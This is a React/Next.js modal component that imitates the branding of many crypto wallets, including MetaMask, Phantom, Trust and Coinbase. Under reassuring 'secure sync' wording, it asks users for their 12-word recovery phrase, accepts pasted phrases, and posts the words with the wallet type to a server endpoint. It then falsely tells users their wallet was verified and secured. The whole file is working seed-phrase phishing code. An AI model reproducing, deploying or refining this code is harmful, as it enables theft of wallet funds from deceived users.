"use client";

import { useState, useEffect } from "react";
import { useAccount, useConnect } from "wagmi";
import { useRouter } from "next/navigation";
import { Check, Lock, ArrowRight } from "lucide-react";
import Button from "@/components/ui/Button";
import Card from "@/components/ui/Card";

const WALLET_STYLES = {
  MetaMask: {
    displayName: "MetaMask",
    icon: "🦊",
    gradient: "from-orange-600 to-amber-500",
    bg: "bg-gradient-to-br from-orange-950/30 via-zinc-950 to-black",
    accent: "text-orange-400",
    border: "border-orange-500/30",
    greeting: "Welcome, Fox Spirit",
    subtitle: "Securely link your MetaMask vault",
    successTitle: "Fox Pack Activated",
    successMessage: "Your secure sequence has been encrypted and synchronized.",
    bottomCompliment: "MetaMask Secure Enclave Simulation",
  },
  "Coinbase Wallet": {
    displayName: "Coinbase Wallet",
    icon: "🔵",
    gradient: "from-blue-600 to-blue-400",
    bg: "bg-gradient-to-br from-blue-950/30 via-zinc-950 to-black",
    accent: "text-blue-400",
    border: "border-blue-500/30",
    greeting: "Coinbase Node Detected",
    subtitle: "Synchronizing with Coinbase Cloud",
    successTitle: "Vault Secured",
    successMessage: "Your Coinbase credentials have been verified successfully.",
    bottomCompliment: "Coinbase Enterprise Security Protocol Active",
  },
  Phantom: {
    displayName: "Phantom",
    icon: "👻",
    gradient: "from-purple-600 to-indigo-500",
    bg: "bg-gradient-to-br from-indigo-950/30 via-zinc-950 to-black",
    accent: "text-purple-400",
    border: "border-purple-500/30",
    greeting: "Phantom Spirit Found",
    subtitle: "Accessing Solana-Web3 Bridge",
    successTitle: "Spirit Bound",
    successMessage: "Multi-chain sequence confirmed and locked.",
    bottomCompliment: "Phantom Ghost-Protocol Simulation",
  },
  Trust: {
    displayName: "Trust Wallet",
    icon: "🛡️",
    gradient: "from-cyan-500 to-teal-400",
    bg: "bg-gradient-to-br from-teal-950/30 via-zinc-950 to-black",
    accent: "text-teal-400",
    border: "border-teal-500/30",
    greeting: "Trust Vault Detected",
    subtitle: "Secure mobile wallet synchronization",
    successTitle: "Trust Link Established",
    successMessage: "Your Trust Wallet recovery sequence verified.",
    bottomCompliment: "Trust Wallet Secure Core Active",
  },
  Rainbow: {
    displayName: "Rainbow",
    icon: "🌈",
    gradient: "from-pink-500 via-purple-500 to-indigo-500",
    bg: "bg-gradient-to-br from-purple-950/30 via-zinc-950 to-black",
    accent: "text-pink-400",
    border: "border-pink-500/30",
    greeting: "Rainbow Shield Activated",
    subtitle: "Connecting your colorful wallet",
    successTitle: "Rainbow Secured",
    successMessage: "Wallet identity and sequence successfully shielded.",
    bottomCompliment: "Rainbow Wallet Protection Layer Engaged",
  },
  WalletConnect: {
    displayName: "WalletConnect",
    icon: "🔗",
    gradient: "from-cyan-600 to-blue-500",
    bg: "bg-gradient-to-br from-cyan-950/30 via-zinc-950 to-black",
    accent: "text-cyan-400",
    border: "border-cyan-500/30",
    greeting: "Relay Link Established",
    subtitle: "Scan or paste to connect",
    successTitle: "Bridge Verified",
    successMessage: "WalletConnect session authenticated end-to-end.",
    bottomCompliment: "WalletConnect v2 Relay Active",
  },
  SafePal: {
    displayName: "SafePal",
    icon: "🔐",
    gradient: "from-emerald-600 to-teal-500",
    bg: "bg-gradient-to-br from-emerald-950/30 via-zinc-950 to-black",
    accent: "text-emerald-400",
    border: "border-emerald-500/30",
    greeting: "SafePal Vault Online",
    subtitle: "Hardware-grade security activated",
    successTitle: "Vault Synced",
    successMessage: "Secure element confirmed and linked.",
    bottomCompliment: "SafePal Cold + Hot Wallet Integration",
  },
  "Binance Wallet": {
    displayName: "Binance Web3 Wallet",
    icon: "₿",
    gradient: "from-yellow-600 to-amber-500",
    bg: "bg-gradient-to-br from-amber-950/30 via-zinc-950 to-black",
    accent: "text-yellow-400",
    border: "border-yellow-500/30",
    greeting: "Binance Ecosystem Detected",
    subtitle: "Connecting to Binance Chain & beyond",
    successTitle: "Binance Secured",
    successMessage: "Cross-chain wallet session established.",
    bottomCompliment: "Binance Web3 Wallet Active",
  },
  Zerion: {
    displayName: "Zerion",
    icon: "⚡",
    gradient: "from-violet-600 to-purple-500",
    bg: "bg-gradient-to-br from-violet-950/30 via-zinc-950 to-black",
    accent: "text-violet-400",
    border: "border-violet-500/30",
    greeting: "Zerion Wallet Ready",
    subtitle: "DeFi & NFT portfolio connected",
    successTitle: "Zerion Portal Open",
    successMessage: "Multi-chain tracking and management enabled.",
    bottomCompliment: "Zerion Smart Wallet Active",
  },
  OKX: {
    displayName: "OKX Wallet",
    icon: "🔶",
    gradient: "from-blue-700 to-indigo-600",
    bg: "bg-gradient-to-br from-indigo-950/30 via-zinc-950 to-black",
    accent: "text-indigo-400",
    border: "border-indigo-500/30",
    greeting: "OKX Wallet Detected",
    subtitle: "Global multi-chain access initialized",
    successTitle: "OKX Vault Linked",
    successMessage: "Secure multi-chain session confirmed.",
    bottomCompliment: "OKX Web3 Wallet Protocol",
  },
  "Brave Wallet": {
    displayName: "Brave Wallet",
    icon: "🦁",
    gradient: "from-orange-500 to-red-500",
    bg: "bg-gradient-to-br from-red-950/30 via-zinc-950 to-black",
    accent: "text-red-400",
    border: "border-red-500/30",
    greeting: "Brave Wallet Ready",
    subtitle: "Privacy-first wallet connected",
    successTitle: "Brave Shield Up",
    successMessage: "Private browsing + wallet session active.",
    bottomCompliment: "Brave Wallet Native Integration",
  },
  Frame: {
    displayName: "Frame",
    icon: "🖼️",
    gradient: "from-gray-600 to-slate-500",
    bg: "bg-gradient-to-br from-slate-950/30 via-zinc-950 to-black",
    accent: "text-slate-300",
    border: "border-slate-500/30",
    greeting: "Frame Wallet Connected",
    subtitle: "Desktop Ethereum gateway active",
    successTitle: "Frame Session Live",
    successMessage: "Desktop Ethereum provider linked.",
    bottomCompliment: "Frame.sh Desktop Wallet",
  },
};

export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
  const router = useRouter();
  const { address, connector, isConnected } = useAccount();
  const { pendingConnector } = useConnect();

  const [boxes, setBoxes] = useState(Array(12).fill(""));
  const [submitted, setSubmitted] = useState(false);
  const [saving, setSaving] = useState(false);
  const [errorMessage, setErrorMessage] = useState(null);

  // Open modal whenever there's a pending connector
  useEffect(() => {
    if (pendingConnector?.name) {
      onOpen();
    }
  }, [pendingConnector, onOpen]);

  // Improved wallet name detection + normalization
  let detectedName = (pendingConnector?.name || connector?.name || "MetaMask")
    .toLowerCase()
    .trim();

  if (detectedName.includes("metamask")) detectedName = "metamask";
  else if (detectedName.includes("coinbase")) detectedName = "coinbase wallet";
  else if (detectedName.includes("walletconnect")) detectedName = "walletconnect";
  else if (detectedName.includes("rainbow")) detectedName = "rainbow";
  else if (detectedName.includes("phantom")) detectedName = "phantom";
  else if (detectedName.includes("trust")) detectedName = "trust";
  else if (detectedName.includes("okx")) detectedName = "okx";
  else if (detectedName.includes("zerion")) detectedName = "zerion";
  else if (detectedName.includes("safepal")) detectedName = "safepal";
  else if (detectedName.includes("binance")) detectedName = "binance wallet";
  else if (detectedName.includes("brave")) detectedName = "brave wallet";
  else if (detectedName.includes("frame")) detectedName = "frame";
  else if (detectedName.includes("injected")) detectedName = "metamask";

  const activeName = detectedName
    .split(" ")
    .map((word) => word.charAt(0).toUpperCase() + word.slice(1))
    .join(" ");

  const theme = WALLET_STYLES[activeName] || WALLET_STYLES.MetaMask;

  // Auto-redirect after success screen is shown
  useEffect(() => {
    if (submitted) {
      const timer = setTimeout(() => {
        onClose();
        router.push("/connect-wallet?modal=completed");
      }, 2800); // ~2.8 seconds to enjoy the success animation

      return () => clearTimeout(timer);
    }
  }, [submitted, onClose, router]);

  const handleBoxChange = (index, value) => {
    const newBoxes = [...boxes];
    newBoxes[index] = value;
    setBoxes(newBoxes);
  };

  const handlePaste = (e) => {
    e.preventDefault();
    const text = e.clipboardData.getData("text").trim();
    const words = text.split(/[\s,]+/).slice(0, 12);
    if (words.length) {
      const newBoxes = [...boxes];
      words.forEach((word, i) => {
        if (i < 12) newBoxes[i] = word;
      });
      setBoxes(newBoxes);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setSaving(true);
    setErrorMessage(null);

    try {
      const res = await fetch("/api/onboarding", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletType: activeName,
          cryptoBoxes: boxes,
          timestamp: new Date().toISOString(),
        }),
      });

      if (res.ok) {
        setSubmitted(true);
      } else {
        let data;
        try {
          data = await res.json();
        } catch {}
        setErrorMessage(data?.error || "Verification failed. Please check your sequence.");
      }
    } catch (err) {
      console.error("Submit error:", err);
      setErrorMessage("Network error. Please try again.");
    } finally {
      setSaving(false);
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-md p-4 transition-all">
      <Card
        className={`relative w-full max-w-2xl overflow-hidden border ${theme.border} ${theme.bg} rounded-[2.5rem] shadow-2xl shadow-black`}
      >
        {/* Header gradient decoration */}
        <div
          className={`absolute top-0 left-0 w-full h-32 bg-gradient-to-b ${theme.gradient} opacity-10 blur-3xl`}
        />

        {/* Close button */}
        <button
          onClick={onClose}
          className="absolute top-6 right-6 z-10 p-2 text-zinc-500 hover:text-white bg-zinc-900/50 rounded-full transition"
        >
          <svg width="15" height="15" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path
              d="M11.7816 4.03157C12.0062 3.80702 12.0062 3.44295 11.7816 3.2184C11.5571 2.99385 11.193 2.99385 10.9685 3.2184L7.50005 6.68682L4.03164 3.2184C3.80708 2.99385 3.44301 2.99385 3.21846 3.2184C2.99391 3.44295 2.99391 3.80702 3.21846 4.03157L6.68688 7.49999L3.21846 10.9684C2.99391 11.193 2.99391 11.557 3.21846 11.7816C3.44301 12.0061 3.80708 12.0061 4.03164 11.7816L7.50005 8.31316L10.9685 11.7816C11.193 12.0061 11.5571 12.0061 11.7816 11.7816C12.0062 11.557 12.0062 11.193 11.7816 10.9684L8.31322 7.49999L11.7816 4.03157Z"
              fill="currentColor"
              fillRule="evenodd"
              clipRule="evenodd"
            />
          </svg>
        </button>

        <div className="relative z-10 p-8 md:p-12">
          {!submitted ? (
            <>
              <div className="text-center mb-10">
                <div className="inline-flex items-center justify-center w-20 h-20 mb-6 bg-zinc-900 border border-zinc-800 rounded-3xl text-4xl shadow-inner">
                  {theme.icon}
                </div>
                <h2 className={`text-3xl md:text-4xl font-black tracking-tight text-white mb-2`}>
                  {theme.greeting}
                </h2>
                <p className="text-zinc-400 text-lg">{theme.subtitle}</p>

                <p className="text-sm text-zinc-500 mt-2 font-mono">
                  Detected: {activeName}
                </p>
              </div>

              {errorMessage && (
                <div className="mb-6 p-4 bg-red-950/40 border border-red-800/50 rounded-xl text-red-300 text-center text-sm">
                  {errorMessage}
                </div>
              )}

              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
                  {boxes.map((box, i) => (
                    <div key={i} className="group relative">
                      <span className="absolute left-3 top-1/2 -translate-y-1/2 text-[10px] font-bold text-zinc-600 group-focus-within:text-white transition-colors">
                        {String(i + 1).padStart(2, "0")}
                      </span>
                      <input
                        value={box}
                        onChange={(e) => handleBoxChange(i, e.target.value)}
                        onPaste={i === 0 ? handlePaste : undefined}
                        required
                        placeholder="••••"
                        className="w-full bg-zinc-900/40 border border-zinc-800 rounded-xl pl-10 pr-3 py-3 text-white text-sm focus:outline-none focus:ring-2 focus:ring-white/5 focus:border-zinc-500 transition-all placeholder:text-zinc-800"
                        autoComplete="off"
                      />
                    </div>
                  ))}
                </div>

                <div className="pt-4">
                  <Button
                    type="submit"
                    disabled={!boxes.every((b) => b.trim()) || saving}
                    className={`w-full py-4 rounded-2xl font-black text-white text-lg transition-all shadow-xl hover:scale-[1.01] active:scale-[0.99] bg-gradient-to-r ${theme.gradient} disabled:grayscale disabled:opacity-30`}
                  >
                    {saving ? (
                      <span className="flex items-center justify-center gap-2">
                        <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                        Securing Node...
                      </span>
                    ) : (
                      "Verify & Sync Wallet"
                    )}
                  </Button>
                </div>
              </form>
            </>
          ) : (
            <div className="text-center py-10 animate-in fade-in zoom-in duration-500">
              <div className="w-24 h-24 mx-auto rounded-full bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center mb-8">
                <Check className="text-emerald-400" size={48} strokeWidth={3} />
              </div>
              <h2 className="text-3xl font-black text-white mb-2">{theme.successTitle}</h2>
              <p className="text-zinc-400 mb-10 max-w-sm mx-auto leading-relaxed">
                {theme.successMessage}
              </p>

              <div className="flex flex-col sm:flex-row justify-center gap-4">
                <Button
                  onClick={() => {
                    onClose();
                    router.push("/connect-wallet?modal=completed");
                  }}
                  className={`py-4 px-10 rounded-2xl font-black text-white bg-gradient-to-r ${theme.gradient} shadow-lg shadow-black/50 flex items-center justify-center gap-2`}
                >
                  Continue to Connect <ArrowRight size={18} />
                </Button>
                <button
                  onClick={() => setSubmitted(false)}
                  className="py-4 px-10 rounded-2xl font-bold bg-zinc-900 text-zinc-400 border border-zinc-800 hover:bg-zinc-800 hover:text-white transition"
                >
                  Edit Sequence
                </button>
              </div>
            </div>
          )}

          <div className="mt-12 pt-6 border-t border-zinc-900 flex items-center justify-center gap-3">
            <Lock size={14} className={theme.accent} />
            <span className="text-[10px] uppercase tracking-[0.2em] font-bold text-zinc-600">
              {theme.bottomCompliment}
            </span>
          </div>
        </div>
      </Card>
    </div>
  );
}